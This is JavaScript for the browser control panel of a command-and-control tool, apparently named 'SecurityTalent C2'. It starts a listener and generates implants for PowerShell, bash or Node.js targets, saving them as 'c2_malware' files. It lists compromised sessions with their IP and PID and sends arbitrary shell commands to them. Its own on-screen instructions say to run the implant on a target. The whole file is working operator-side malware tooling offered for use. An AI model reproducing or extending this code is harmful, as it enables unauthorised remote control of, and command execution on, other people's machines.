
const socket = io({ transports:["websocket","polling"], reconnection:true, reconnectionAttempts:5 });
let currentSession = null;
let currentSessions = [];
const el = id => document.getElementById(id);

function log(msg, color="#00ff41") {
  const term = el("terminal");
  const time = new Date().toLocaleTimeString();
  term.innerHTML += `<span style="color:${color}">[${time}] ${msg}</span>\n`;
  term.scrollTop = term.scrollHeight;
}

function updateSessions(sessions) {
  currentSessions = Array.isArray(sessions)?sessions:[];
  el("sessionCount").textContent = currentSessions.length;
  if(currentSessions.length===0){
    el("sessions").innerHTML=`<div style="text-align:center;color:#666;padding:60px;font-size:18px;grid-column:1/-1;">🚫 No active sessions<br><small style="font-size:14px;">1️⃣ START LISTENER → 2️⃣ GENERATE IMPLANT → 3️⃣ RUN ON TARGET</small></div>`;
  } else {
    el("sessions").innerHTML = currentSessions.map(s=>`<div class="session ${currentSession===s.id?"active":""}" data-session-id="${s.id}"><div><strong>🎯 ${s.name}</strong> <small style="color:#aaa">(${s.ip})</small></div><div class="session-info">PID:${s.pid} | ${s.arch} | ${new Date(s.lastSeen).toLocaleTimeString()}</div></div>`).join("");
  }
  updateUIState();
}

function updateUIState() {
  const hasSession = !!currentSession;
  el("cmdInput").disabled = !hasSession;
  el("execBtn").disabled = !hasSession;
  el("currentSessionName").textContent = currentSession?`Session ${currentSession.slice(0,8)}...`:"No Session";
}

// Implant generated handler
socket.on("implant_generated", data => {
  el("implantCode").value = data.code;
  el("downloadBtn").disabled = false;
  log(`✅ ${data.targetOS} implant generated for ${data.serverIP}:${data.port}`, "#00ff41");
});

// Start/Stop listener
el("startBtn").onclick = () => {
  const port = parseInt(el("newPort")?.value||el("listenerPort").value||4444);
  socket.emit("start_listener", port);
  log(`🚀 Starting listener: ${port}`);
};
el("stopBtn").onclick = () => {
  socket.emit("stop_listener");
  log("⏹️ Stopping listener");
};

// Generate implant
el("generateBtn").onclick = () => {
  const os = el("targetOS").value;
  const interval = parseInt(el("beaconInterval").value) || 5000;
  const port = parseInt(el("listenerPort").value) || 4444;
  el("implantCode").value = "[⏳ Generating...]";
  socket.emit("generate_implant", { targetOS: os, beaconInterval: interval, port });
  log(`⏳ Generating ${os} implant...`);
};

// Download implant (dynamic extension)
el("downloadBtn").onclick = () => {
  const code = el("implantCode").value;
  if(!code || code.trim()==="" || code.includes("[⏳")) {
    log("❌ No valid implant!", "#ff3333");
    return;
  }
  try{
    const blob = new Blob([code], { type:"text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;

    // Determine extension based on OS
    const os = el("targetOS").value;
    let ext = "txt";
    if(os==="powershell") ext="ps1";
    else if(os==="bash") ext="sh";
    else if(os==="nodejs") ext="js";

    a.download = `c2_malware.${ext}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(()=>URL.revokeObjectURL(url),1000);
    log(`💾 Downloaded as c2_malware.${ext}`, "#00ff41");
  } catch(err){
    console.error(err);
    log("❌ Download failed!", "#ff3333");
  }
};

// Execute commands
el("execBtn").onclick = execCmd;
el("cmdInput").onkeypress = e => { if(e.key==="Enter") execCmd(); };
function execCmd(){
  const cmd = el("cmdInput").value.trim();
  if(!currentSession||!cmd){ log("❌ Select session & enter command!", "#ff3333"); return; }
  socket.emit("exec_cmd",{sessionId:currentSession, cmd});
  log(`$ ${cmd}`, "#ffaa00");
  el("cmdInput").value="";
}

// Socket events
socket.on("connect", ()=>log("✅ C2 Server Connected!","#00ff41"));
socket.on("sessions_update", updateSessions);
socket.on("listener_status", status=>{
  const statusEl = el("status");
  if(status.running){
    statusEl.textContent=`✅ LIVE: ${status.port}`;
    statusEl.className="status green";
    el("startBtn").disabled=true; el("stopBtn").disabled=false;
    log(`✅ Listener LIVE: ${status.port}`, "#00ff41");
  } else {
    statusEl.textContent="❌ OFFLINE";
    statusEl.className="status red";
    el("startBtn").disabled=false; el("stopBtn").disabled=true;
    log("❌ Listener stopped","#ff3333");
  }
});
socket.on("output", ({sessionId,data})=>{ if(currentSession===sessionId) log(data,"#00ff41"); });
socket.on("server_log", ({type,message})=>log(`[SERVER] ${message}`, type.includes("error")?"#ff3333":"#ffaa00"));

// Session selection
document.addEventListener("click", e=>{
  const sessionEl = e.target.closest(".session");
  if(sessionEl){
    const sessionId = sessionEl.dataset.sessionId;
    if(currentSession!==sessionId){
      currentSession=sessionId;
      updateSessions(currentSessions);
      log(`✅ Session: ${sessionId.slice(0,8)}`, "#00ff41");
    }
  }
});

log("🚀 SecurityTalent C2 v2.1- LOADED & READY!");